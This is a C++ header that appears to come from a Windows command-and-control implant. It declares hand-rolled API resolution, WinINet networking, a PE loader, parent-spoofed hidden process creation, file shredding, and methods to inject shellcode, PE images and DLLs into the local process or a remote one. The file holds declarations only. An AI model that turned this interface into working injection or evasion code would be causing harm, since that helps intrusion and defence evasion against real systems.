#pragma once

#define SECURITY_WIN32

#include <windows.h>
#include <aclapi.h>
#include <wchar.h>
#include <winternl.h>
#include <wininet.h>
#include <Security.h>
#include "buffer.h"
#include "constants.h"

/* Helper methods */

HMODULE GetModuleHandleCustom(PCHAR moduleName);
PVOID GetProcAddressCustom(HMODULE hModule, PCHAR procName);
HMODULE LoadLibraryCustom(IN PCHAR moduleName);
DWORD FreeLibraryCustom(IN HMODULE hModule);

// Enum for Type of securable object
typedef enum _SECURABLE_OBJECT_TYPE_CUSTOM
{
    FILE_OBJ,
    DIRECTORY,
    FILE_MAPPING_OBJECT,
    PROCESS,
    THREAD,
    SC_MANAGER,
    SERVICE,
    REGISTRY,
    ACCESS_TOKEN
} SECURABLE_OBJECT_TYPE_CUSTOM;

//////////
// STRUCTS
//////////

// For PE loader
typedef struct _PE_LOADER_PROCESS_PARAM_STORE
{
    WORD commandlineLenOrig;
    PWCHAR commandlineOrig;
} PE_LOADER_PROCESS_PARAM_STORE, *PPE_LOADER_PROCESS_PARAM_STORE;

typedef struct _PE_LOADER_IMAGE_FILE_DETAILS
{
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER OptionalHeader;

    BOOL IsDll;
    DWORD64 ImageBase; // absolute
    DWORD SizeOfImage;
    DWORD AddressOfEntryPointOffset; // relative

    WORD NumOfSections;
    PIMAGE_SECTION_HEADER SectionHeaderFirst; // absolute

    PIMAGE_DATA_DIRECTORY pDataDirectoryExport;
    PIMAGE_DATA_DIRECTORY pDataDirectoryImport;
    PIMAGE_DATA_DIRECTORY pDataDirectoryReloc;
    PIMAGE_DATA_DIRECTORY pDataDirectoryException;
} PE_LOADER_IMAGE_FILE_DETAILS, *PPE_LOADER_IMAGE_FILE_DETAILS;

typedef struct _IMAGE_BASE_RELOCATION_ENTRY
{
    WORD Offset : 12;
    WORD Type : 4;
} IMAGE_BASE_RELOCATION_ENTRY, *PIMAGE_BASE_RELOCATION_ENTRY;

// AccessMask parsed values; https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks
typedef struct _ACCESS_MASK_CUSTOM
{
    /* Specific rights - files & directories; https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-mask */
    BYTE FileReadEA : 1;
    BYTE FileWriteEA : 1;
    BYTE FileReadAttributes : 1;
    BYTE FileWriteAttributes : 1;

    /* Specific rights - files; https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-mask */
    BYTE FileReadData : 1;
    BYTE FileWriteData : 1;
    BYTE FileAppendData : 1;
    BYTE FileExecute : 1;

    /* Specific rights - directories; https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-mask */
    BYTE FileListDirectory : 1;
    BYTE FileAddFile : 1;
    BYTE FileAddSubdirectory : 1;
    BYTE FileTraverse : 1;
    BYTE FileDeleteChild : 1;

    /* Specific rights - file mapping object; https://learn.microsoft.com/en-us/windows/win32/memory/file-mapping-security-and-access-rights */
    BYTE FileMapAllAccess : 1;
    BYTE FileMapExecute : 1;
    BYTE FileMapRead : 1;
    BYTE FileMapWrite : 1;

    /* Specific rights - process; https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights */
    BYTE ProcessAllAccess : 1;
    BYTE ProcessCreateProcess : 1;
    BYTE ProcessCreateThread : 1;
    BYTE ProcessQueryInformation : 1;
    BYTE ProcessQueryLimitedInformation : 1;
    BYTE ProcessSetInformation : 1;
    BYTE ProcessSetQuota : 1;
    BYTE ProcessSuspendResume : 1;
    BYTE ProcessTerminate : 1;
    BYTE ProcessVmOperation : 1;
    BYTE ProcessVmRead : 1;
    BYTE ProcessVmWrite : 1;

    /* Specific rights - thread; https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights */
    BYTE ThreadAllAccess : 1;
    BYTE ThreadDirectImpersonation : 1;
    BYTE ThreadGetContext : 1;
    BYTE ThreadImpersonate : 1;
    BYTE ThreadQueryInformation : 1;
    BYTE ThreadQueryLimitedInformation : 1;
    BYTE ThreadSetContext : 1;
    BYTE ThreadSetInformation : 1;
    BYTE ThreadSetLimitedInformation : 1;
    BYTE ThreadSetThreadToken : 1;
    BYTE ThreadSuspendResume : 1;
    BYTE ThreadTerminate : 1;

    /* Specific rights - service control manager; https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights */
    BYTE ScManagerAllAccess : 1;
    BYTE ScManagerCreateService : 1;
    BYTE ScManagerConnect : 1;
    BYTE ScManagerEnumerateService : 1;
    BYTE ScManagerLock : 1;
    BYTE ScManagerModifyBootConfig : 1;
    BYTE ScManagerQueryLockStatus : 1;

    /* Specific rights - services; https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights */
    BYTE ServiceAllAccess : 1;
    BYTE ServiceChangeConfig : 1;
    BYTE ServiceEnumerateDepedents : 1;
    BYTE ServiceInterrogate : 1;
    BYTE ServicePauseContinue : 1;
    BYTE ServiceQueryConfig : 1;
    BYTE ServiceQueryStatus : 1;
    BYTE ServiceStart : 1;
    BYTE ServiceStop : 1;
    BYTE ServiceUserDefinedControl : 1;

    /* Specific rights - registry; https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights */
    BYTE KeyAllAccess : 1;
    BYTE KeyCreateLink : 1;
    BYTE KeyCreateSubKey : 1;
    BYTE KeyEnumerateSubKeys : 1;
    BYTE KeyExecute : 1;
    BYTE KeyNotify : 1;
    BYTE KeyQueryValue : 1;
    BYTE KeyRead : 1;
    BYTE KeySetValue : 1;
    BYTE KeyWow6432Key : 1;
    BYTE KeyWow6464Key : 1;
    BYTE KeyWrite : 1;

    /* Specific rights - access token; https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects */
    BYTE TokenAllAccess : 1;
    BYTE TokenAdjustDefault : 1;
    BYTE TokenAdjustGroups : 1;
    BYTE TokenAdjustPrivileges : 1;
    BYTE TokenAdjustSessionId : 1;
    BYTE TokenAssignPrimary : 1;
    BYTE TokenDuplicate : 1;
    BYTE TokenExecute : 1;
    BYTE TokenImpersonate : 1;
    BYTE TokenQuery : 1;
    BYTE TokenQuerySource : 1;
    BYTE TokenRead : 1;
    BYTE TokenWrite : 1;

    /* Specific rights - named and anonymous pipes */
    // Same as Generic rights

    /* Standard rights */
    BYTE StandardAll : 1;
    BYTE Delete : 1;
    BYTE ReadControl : 1;
    BYTE WriteDac : 1;
    BYTE WriteOwner : 1;
    BYTE Synchronize : 1;

    /* Generic rights */
    BYTE GenericAll : 1;
    BYTE GenericRead : 1;
    BYTE GenericWrite : 1;
    BYTE GenericExecute : 1;
} ACCESS_MASK_CUSTOM, *PACCESS_MASK_CUSTOM;

// Custom ACE structure
typedef struct _ACE_CUSTOM
{
    ACCESS_MASK_CUSTOM accessMask; // What type of right is given to trustee
    SID sidTrustee;                // SID of trustee
    BOOL allowed;                  // TRUE if allowed, FALSE if denied
} ACE_CUSTOM, *PACE_CUSTOM;

// Custom security descriptor struct
typedef struct _SECURITY_INFO_CUSTOM
{
    SID sidOwner;
    SID sidGroup;
    WORD acesNum;            // Number of ACEs in pAcesCustom
    PACE_CUSTOM pAcesCustom; // Array of ACE_CUSTOMs; must be manually freed
} SECURITY_INFO_CUSTOM, *PSECURITY_INFO_CUSTOM;

/* Struct to store pointers to Modules */
struct LoadedModules
{
    HMODULE hNtdll;
    HMODULE hKernel32;
    HMODULE hKernelbase;
    HMODULE hUser32;
    HMODULE hWininet;
    HMODULE hBcrypt;
    HMODULE hAdvapi32;
};

/* Struct to store pointers to Functions */
struct LoadedFunctions
{
    int (*MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
    HMODULE (*LoadLibraryA)(LPCSTR lpLibFileName);
    BOOL (*FreeLibrary)(HMODULE hLibModule);
    HINTERNET (*InternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
    HINTERNET (*InternetConnectA)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
    HINTERNET (*HttpOpenRequestA)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
    BOOL (*HttpSendRequestA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
    BOOL (*InternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
    BOOL (*InternetCloseHandle)(HINTERNET hInternet);
    BOOL (*InternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
    HANDLE (*GetProcessHeap)();
    LPVOID (*HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
    LPVOID (*HeapReAlloc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
    BOOL (*HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
    DWORD (*GetLastError)();
    NTSTATUS (*BCryptOpenAlgorithmProvider)(BCRYPT_ALG_HANDLE *phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
    NTSTATUS (*BCryptCloseAlgorithmProvider)(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);
    NTSTATUS (*BCryptGenRandom)(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags);
    HANDLE (*CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
    HANDLE (*CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
    DWORD (*WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
    BOOL (*ReleaseMutex)(HANDLE hMutex);
    BOOL (*CloseHandle)(HANDLE hObject);
    HANDLE (*CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
    BOOL (*SetEvent)(HANDLE hEvent);
    BOOL (*ResetEvent)(HANDLE hEvent);
    BOOL (*GetComputerNameExA)(IN COMPUTER_NAME_FORMAT NameType, OUT LPSTR lpBuffer, IN OUT LPDWORD nSize);
    BOOL (*OpenProcessToken)(IN HANDLE ProcessHandle, IN DWORD DesiredAccess, OUT PHANDLE TokenHandle);
    BOOL (*GetTokenInformation)(IN HANDLE TokenHandle, IN TOKEN_INFORMATION_CLASS TokenInformationClass, OUT LPVOID TokenInformation, IN DWORD TokenInformationLength, OUT PDWORD ReturnLength);
    BOOL (*LookupAccountSidA)(IN LPCSTR lpSystemName, IN PSID Sid, OUT LPSTR Name, IN LPDWORD cchName, OUT LPSTR ReferencedDomainName, IN OUT LPDWORD cchReferencedDomainName, OUT PSID_NAME_USE peUse);
    HANDLE (*CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
    HANDLE (*CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
    LPVOID (*MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
    BOOL (*GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
    BOOL (*UnmapViewOfFile)(LPCVOID lpBaseAddress);
    BOOL (*FlushViewOfFile)(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush);
    BOOL (*FlushFileBuffers)(HANDLE hFile);
    DWORD (*GetCurrentDirectoryA)(DWORD nBufferLength, PCHAR lpBuffer);
    BOOL (*SetCurrentDirectoryA)(PCHAR lpPathName);
    DWORD (*GetSecurityInfo)(HANDLE handle, SE_OBJECT_TYPE ObjectType, SECURITY_INFORMATION SecurityInfo, PSID *ppsidOwner, PSID *ppsidGroup, PACL *ppDacl, PACL *ppSacl, PSECURITY_DESCRIPTOR *ppSecurityDescriptor);
    HLOCAL (*LocalFree)(HLOCAL hMem);
    HANDLE (*FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
    BOOL (*FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
    BOOL (*FindClose)(HANDLE hFindFile);
    DWORD (*GetFileAttributesA)(LPCSTR lpFileName);
    BOOL (*CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
    BOOL (*CreateDirectoryA)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
    BOOL (*FileTimeToSystemTime)(FILETIME *lpFileTime, LPSYSTEMTIME lpSystemTime);
    int (*GetDateFormatEx)(LPCWSTR lpLocaleName, DWORD dwFlags, SYSTEMTIME *lpDate, LPCWSTR lpFormat, LPWSTR lpDateStr, int cchDate, LPCWSTR lpCalendar);
    int (*GetTimeFormatEx)(LPCWSTR lpLocaleName, DWORD dwFlags, SYSTEMTIME *lpTime, LPCWSTR lpFormat, LPWSTR lpTimeStr, int cchTime);
    BOOL (*MoveFileExA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, DWORD dwFlags);
    BOOL (*SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
    BOOL (*WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
    BOOL (*DeleteFileA)(LPCSTR lpFileName);
    BOOL (*RemoveDirectoryA)(LPCSTR lpPathName);
    BOOL (*HeapValidate)(HANDLE hHeap, DWORD dwFlags, LPCVOID lpMem);
    BOOL (*ConvertSidToStringSidA)(PSID Sid, LPSTR *StringSid);
    NTSTATUS (*NtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
    DWORD (*GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
    HANDLE (*OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
    BOOL (*CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
    BOOL (*InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwAttributeCount, DWORD dwFlags, PSIZE_T lpSize);
    BOOL (*UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, DWORD dwFlags, DWORD_PTR Attribute, PVOID lpValue, SIZE_T cbSize, PVOID lpPreviousValue, PSIZE_T lpReturnSize);
    void (*DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList);
    HANDLE (*OpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
    DWORD (*SuspendThread)(HANDLE hThread);
    DWORD (*ResumeThread)(HANDLE hThread);
    BOOL (*ReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
    BOOL (*WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
    NTSTATUS (*NtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
    BOOL (*TerminateProcess)(HANDLE hProcess, UINT uExitCode);
    BOOL (*DuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
    NTSTATUS (*NtQueueApcThread)(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine, PVOID ApcRoutineContext OPTIONAL, PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL, ULONG ApcReserved OPTIONAL);
    NTSTATUS (*NtTestAlert)();
    HANDLE (*CreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
    PVOID (*MapViewOfFile2)(HANDLE FileMappingHandle, HANDLE ProcessHandle, ULONG64 Offset, PVOID BaseAddress, SIZE_T ViewSize, ULONG AllocationType, ULONG PageProtection);
    FARPROC (*GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
    BOOL (*VirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
    LPVOID (*VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    BOOL (*VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
    BOOLEAN (*RtlAddFunctionTable)(PRUNTIME_FUNCTION FunctionTable, DWORD EntryCount, DWORD64 BaseAddress);
};

/* Helper functions for WinApiCustom */
HMODULE GetModuleHandleCustom(PCHAR moduleName);
PVOID GetProcAddressCustom(HMODULE hModule, PCHAR procName);
HMODULE LoadLibraryCustom(IN PCHAR moduleName);
DWORD FreeLibraryCustom(IN HMODULE hModule);

/* Class for WinAPI functions */
class WinApiCustom
{
public:
    /* Constructoe and destructor */

    WinApiCustom();
    ~WinApiCustom();

    /* Loaded modules and their functions */

    LoadedModules loadedModules;
    LoadedFunctions loadedFunctions;

    /* Wrapper methods */

    LPVOID HeapAllocCustom(DWORD sizeOfBufferToAllocate);
    BOOL HeapFreeCustom(LPVOID pBufferToFree);
    LPVOID HeapReAllocCustom(LPVOID lpMem, DWORD dwBytes);
    HANDLE CreateThreadCustom(LPTHREAD_START_ROUTINE pThreadFunc, LPVOID pThreadFuncParams);
    HANDLE CreateMutexCustom();
    LPVOID GetFQDNComputer();
    inline HANDLE GetCurrentProcessHandlePseudo();
    inline HANDLE GetCurrentThreadHandlePseudo();
    void DescribeSid(IN PSID pSid, OUT CHAR **ppSidString, OUT CHAR **ppUserName, OUT CHAR **ppDomainName);
    void GetCurrentUserCustom(OUT CHAR **ppSidString, OUT CHAR **ppUserName, OUT CHAR **ppDomainName);
    PCHAR GetCurrentWorkingDirectoryCustom();
    BOOL ChangeCurrentWorkingDirectoryCustom(PCHAR dirPath);
    LPVOID ReadFileCustom(IN PCHAR filePath, OUT PDWORD64 pNumOfBytesRead);
    BOOL WriteFileCustom(PCHAR filePath, LPVOID whatToWrite, DWORD64 whatToWriteSize);
    BOOL ListDirectoryCustom(IN PCHAR dirPath, OUT WIN32_FIND_DATAA **ppDirListing, OUT PDWORD pDirListingSize);
    void GetFileSecurityInformationCustom(IN PCHAR filePath, OUT PSECURITY_INFO_CUSTOM pSecurityInfoCustom);
    void AccessMaskToAccessMaskCustom(IN SECURABLE_OBJECT_TYPE_CUSTOM objectType, IN ACCESS_MASK accessMask, OUT PACCESS_MASK_CUSTOM pAccessMaskCustom);
    void GetObjectSecurityInfoCustom(IN HANDLE hResource, IN SECURABLE_OBJECT_TYPE_CUSTOM objectType, OUT PSECURITY_INFO_CUSTOM pSecurityInfoCustom);
    void DescribeSecurityInfoCustom(IN PSECURITY_INFO_CUSTOM pSecurityInfoCustom, OUT CHAR **ppSecurityInfoCustomDescribed);
    void DescribeDirectoryListingCustom(IN WIN32_FIND_DATAA *pDirListing, IN DWORD dirListingSize, OUT CHAR **ppOutput);
    void SystemTimeToHumanFormat(IN PSYSTEMTIME pSystemTime, OUT PCHAR pHumanFormatTimestamp);
    void FileTimeToHumanFormat(IN PFILETIME pFileTime, OUT PCHAR pHumanFormatTimestamp);
    BOOL CopyFileCustom(PCHAR sourcePath, PCHAR destPath);
    BOOL MoveFileCustom(PCHAR sourcePath, PCHAR destPath);
    BOOL DeleteFileOrDirCustom(PCHAR filePath);
    BOOL ShredFileCustom(PCHAR filePath, DWORD cycles);
    void GetSystem32Directory(CHAR **ppOutput);
    void GetProcessAll(OUT ULONG *pProcessInformationSizeWritten, OUT SYSTEM_PROCESS_INFORMATION **ppSystemProcessInformation);
    PPEB GetPebOfProcess(IN HANDLE hTargetProcess);
    PSYSTEM_PROCESS_INFORMATION ProcessSearchWithName(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PWCHAR targetProcessName);
    PSYSTEM_PROCESS_INFORMATION ProcessSearchWithId(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, DWORD targetProcessId);
    BOOL CreateNewProcessCustom(IN PCHAR pImagePath, IN PCHAR pCommandLineArgs, IN DWORD parentProcessId, IN PCHAR pCurrentDirectory, IN BOOL createSuspended, IN BOOL createHidden, OUT PPROCESS_INFORMATION pProcessInformation);
    PRTL_USER_PROCESS_PARAMETERS GetProcessParameters(IN HANDLE hProcess, OUT RTL_USER_PROCESS_PARAMETERS **ppProcessParametersInTargetProcess);
    void DescribeProcessListing(IN PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, OUT PCHAR pOutput, OUT PDWORD pOutputSize);
    BOOL ProcessSuspendResume(DWORD targetProcessId, BOOL toResume);
    BOOL ProcessTerminate(DWORD processId);
    void GetCurrentThreadHandleActual(OUT PHANDLE phThread);
    BOOL ProcessInjectShellcodeSelf(BOOL createNewThread, LPVOID pShellcode, DWORD shellcodeSize);
    BOOL ProcessInjectShellcodeRemote(HANDLE hTargetProcess, HANDLE hTargetThread, BOOL isTargetAlreadyAlertable, LPVOID pShellcode, DWORD shellcodeSize);
    void InjectPELocal(LPVOID pPeContent, DWORD peContentSize, PCHAR pInMemPeArgs, BOOL createNewThread, BOOL waitForNewThread);
    void InjectDllLocal(BOOL useCustomLoader, PCHAR pDllPath, LPVOID pDllContents, DWORD64 dllContentsSize, PCHAR pFunctionToInvokeName, LPVOID pFunctionToInvokeArgs, BOOL createNewThread, BOOL waitForNewThread);
};
